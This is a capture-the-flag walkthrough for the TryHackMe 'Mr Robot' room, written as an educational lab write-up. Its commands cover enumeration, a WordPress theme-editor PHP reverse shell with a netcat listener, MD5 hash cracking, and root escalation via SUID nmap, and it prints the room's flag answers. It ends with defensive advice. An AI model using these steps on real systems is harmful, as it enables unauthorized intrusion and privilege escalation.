@@ -1,0 +1,161 @@
+Author: Royalian28
+Last Updated: 2025-10-11
+
+Scope: High-fidelity walkthrough notes for the Mr Robot CTF TryHackMe room. Contains the exact commands used during enumeration, exploitation, and privilege escalation. Use only in authorized lab environments (TryHackMe sandbox). Do not target production or systems you do not own.
+
+Target / OS : Linux (CTF-style, WordPress-hosted web application)
+
+Objective :
+Find the three hidden keys on the machine and obtain an interactive shell, escalate to the robot user, then root the box via an SUID nmap/interactive-shell vector.
+
+# Enumeration :
+Run a service/version and default-script scan:
+nmap -sV -sC -oA nmap_output <TARGET_IP>
+
+Notes & purpose:
+•	Discover open services and versions (confirms web services).
+
+Takeaway:
+•	Found 80/tcp (http) and 443/tcp (https) (Apache) and SSH closed — focus on web-based attack surface.
+Add the target to /etc/hosts (optional — convenient for virtual host names):
+sudo nano /etc/hosts
+# add line:
+# <TARGET_IP>    mrrobot.thm
+Notes: makes browsing the site easier with the expected hostname.
+
+Use Gobuster to hunt for interesting directories and files:
+gobuster dir -u http://mrrobot.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t
+
+Notes & purpose:
+•	Brute-force common directories to reveal hidden files, robots, uploads, or dictionaries.
+
+Takeaway:
+•	Discovered /robots.txt, /fsocity.dic, /key-1-of-3.txt, /wp-login.php, /wp-includes, theme paths and other useful endpoints. (http://<ip_address>/robots.txt)
+
+Visit robots.txt and download the discovered dictionary:
+curl http://mrrobot.thm/robots.txt
+curl http://mrrobot.thm/fsocity.dic > dictionary.txt
+curl http://mrrobot.thm/key-1-of-3.txt
+# key-1-of-3 contents -> 073403c8a58a1f80d943455fb30724b9
+
+Notes & purpose:
+•	fsocity.dic is frequently used in Mr. Robot boxes; key-1-of-3.txt yields the first key immediately. 
+
+Inspect static pages for encoded strings (example: license):
+curl http://mrrobot.thm/license
+# found base64: ZWxsaW90OkVSMjgtMDY1Mgo=
+echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
+# yields: elliot:ER28-0652
+
+Notes & purpose:
+•	Base64-decoding often reveals credentials or hints. Takeaway: recovered credentials elliot:ER28-0652. (Medium)
+
+User Foothold (WordPress login → file edit → webshell)
+
+1.	Log into WordPress with the discovered credentials:
+Visit: http://mrrobot.thm/wp-login.php
+Username: elliot
+Password: ER28-0652
+
+Notes & purpose:
+•	The account has editor privileges (able to edit theme files). Takeaway: this allows writing PHP into theme template files. 
+
+2.	Edit a theme file (e.g., 404.php) to plant a PHP reverse shell (PentestMonkey template). Example workflow:
+# locally copy the pentestmonkey php-reverse-shell, edit $ip(your_system_ip) and $port(4445)
+# In WP Dashboard -> Appearance -> Editor -> 404.php
+# Replace content with php-reverse-shell.php (personalized IP/PORT), then Update File.
+
+Notes & purpose:
+•	Using the theme editor is a straightforward way to get code executed by the webserver. Takeaway: file edited successfully and the new 404.php location is known. 
+
+3.	Start a Netcat listener on your machine:
+nc -lvnp 4444
+
+4.	Trigger the uploaded shell by visiting the edited path:
+http://mrrobot.thm/wp-includes/themes/TwentyFifteen/404.php
+
+Notes & purpose:
+•	Visiting the modified template executes the PHP reverse shell and creates a callback to your listener. Takeaway: obtained a weak shell connection. 
+
+5.	Upgrade the shell for better interactivity:
+python -c 'import pty; pty.spawn("/bin/sh")'
+# Or:
+SHELL=/bin/bash script -q /dev/null
+
+Notes & purpose:
+•	Improves TTY behavior for job control and easier enumeration.
+
+Local Enumeration (inside shell) — pivot to robot user
+1.	Search for interesting files and credentials (example in webroot):
+# check webroot and accessible files
+ls -la /var/www/html
+# or wherever site files are located:
+ls -la /var/www/
+
+Notes:
+•	The site contains key-1-of-3.txt (already captured). Look for other secrets or hashes (e.g., files containing robot or hashes).
+
+2.	Read any discovered hashes and crack if needed:
+# example found: robot:c3fcd3d76192e4007dfb496cca67e13b
+# save to file 'secret'
+echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > secret
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 secret
+# john cracked: “abcdefghijklmnopqrstuvwxyz”
+
+Notes & purpose:
+•	Raw MD5 hash cracked with John using rockyou gives a password useful to su to robot. Takeaway: cracked password “abcdefghijklmnopqrstuvwxyz” 
+
+3.	Switch to robot:
+su robot
+# supply cracked password
+cat /home/robot/ckey-2-of-3.txt
+# key-2-of-3 -> 822c73956184f694993bede3eb39f959
+
+Notes & purpose:
+•	su robot elevates to the robot user and reveals the second key. 
+
+Privilege Escalation (SUID nmap interactive trick)
+1.	Enumerate SUID binaries to find potential escalation vectors:
+find / -perm -4000 -type f 2>/dev/null
+
+Notes & purpose:
+•	Look for SUID root programs (interpreters or utilities with interactive modes). Takeaway: nmap is present with SUID (or an nmap binary that can be abused). 
+
+2.	Use the interactive mode of nmap to escape to a shell (GTFOBins-style / experience-based method). Example sequence used in box:
+nmap --interactive
+# inside nmap prompt:
+!sh
+# now you have a root shell
+whoami
+# root
+cat /root/root.txt
+# root key -> 04787ddef27c3dee1ee161b21670b4e4
+
+Notes & purpose:
+•	nmap --interactive drops you into an interactive prompt that allows shell escape via !sh. When nmap is SUID root, the spawned shell inherits root privileges. Takeaway: root obtained and third key captured. 
+Important: the exact SUID binary and exploit command may vary per box. Always verify which SUID binaries exist and research exploitation techniques (GTFOBins). 
+
+Post-Exploitation
+•	Collected keys:
+o	Key 1: 073403c8a58a1f80d943455fb30724b9 (from /key-1-of-3.txt).
+o	Key 2: 822c73956184f694993bede3eb39f959 (from /home/robot/ckey-2-of-3.txt after su robot).
+o	Key 3: 04787ddef27c3dee1ee161b21670b4e4 (from /root/root.txt after root).
+
+•	Notes:
+o	Remove any uploaded files (if lab rules require cleanup).
+o	Record exact commands and findings for your report.
+
+Cleanup
+•	Remove any webshells or modified theme files (only if allowed by lab rules):
+# from WP dashboard (undo changes) or:
+# restore original 404.php content via editor
+# if you uploaded a file to /wp-includes/... remove it (if permitted)
+rm /var/www/wp-includes/themes/TwentyFifteen/404.php
+exit
+•	Close listeners and clear temporary files on your attacking host.
+
+Defensive Notes
+•	Avoid granting editors file-edit permissions on production sites; restrict theme/file editing in WordPress (DISALLOW_FILE_EDIT in wp-config.php).
+•	Validate and monitor content changes to theme files and admin activity logs.
+•	Do not give SUID to network tools or interpreters; audit SUID binaries and remove unnecessary ones.
+•	Monitor for unusual interactive process usage (e.g., nmap --interactive) and unexpected privilege escalations.
